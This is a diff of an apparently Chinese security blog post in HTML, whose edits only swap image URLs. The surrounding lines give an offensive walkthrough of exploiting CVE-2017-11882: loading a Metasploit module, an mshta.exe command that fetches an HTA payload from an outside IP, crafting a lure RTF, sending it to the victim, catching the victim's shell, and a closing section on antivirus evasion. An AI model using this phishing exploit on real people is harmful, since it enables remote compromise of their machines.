@@ -117,11 +117,11 @@
 <li>7878 用于HTA WebServer</li>
 <li>4455 用于接收客户端Shell</li>
 </ul>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x04.png" alt="0x04"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ed83ce4c-4f5e-11ec-b110-00d861bf4abb.png" alt="0x04"></p>
 <p>接着，将<code>CVE-2017-11882.rb</code>放入metasploit-framework中的exploits目录里，然后打开msfconsole，<code>reload_all</code></p>
 <p>这块不啰嗦</p>
 <p>找一份简单的资料文本，新建一个RTF文件：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x00.png" alt="0x00"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/edd304f8-4f5e-11ec-aa9e-00d861bf4abb.png" alt="0x00"></p>
 <p>找好之后，在里面可以写上你想写的内容 :) 诱惑~ 哈哈</p>
 <p>下一步就要设置msf模块的配置了：</p>
 <pre tabindex="0"><code>msf exploit(CVE-2017-11882) &gt; show options 
@@ -165,12 +165,12 @@ msf exploit(CVE-2017-11882) &gt; [*] Local IP: http://172.**.**.191:7788/1.hta
 mshta.exe &quot;http://118.**.**.77:7788/1.hta&quot;
 </code></pre><p>执行<code>exploit</code>的时候它会提示无法bind外网IP，这属于正常现象，bind不上外网就会bind 0.0.0.0，所以没关系，我们的目的就是把外网IP地址写入HTA~</p>
 <h2 id="0x03-生成钓鱼rtf文档">0x03 生成钓鱼RTF文档</h2>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x01.png" alt="0x01"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ee15740a-4f5e-11ec-9b62-00d861bf4abb.png" alt="0x01"></p>
 <p>此时将exp.rtf发送给对方即可。</p>
 <h2 id="0x04-利用结果">0x04 利用结果</h2>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x02.png" alt="0x02"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ee4d8b56-4f5e-11ec-a095-00d861bf4abb.png" alt="0x02"></p>
 <p>受害者这边：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-22/2017-11-22-0x03.png" alt="0x03"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/eeaf4652-4f5e-11ec-ae0e-00d861bf4abb.png" alt="0x03"></p>
 <h2 id="0x05-关于免杀---mshtaexe">0x05 关于免杀 - mshta.exe</h2>
 <p>mshta被用的太多了，并且很容易被拦截</p>
 <p>可以结合:http://payloads.online/archivers/2017-11-08/1 弄出新姿势</p>
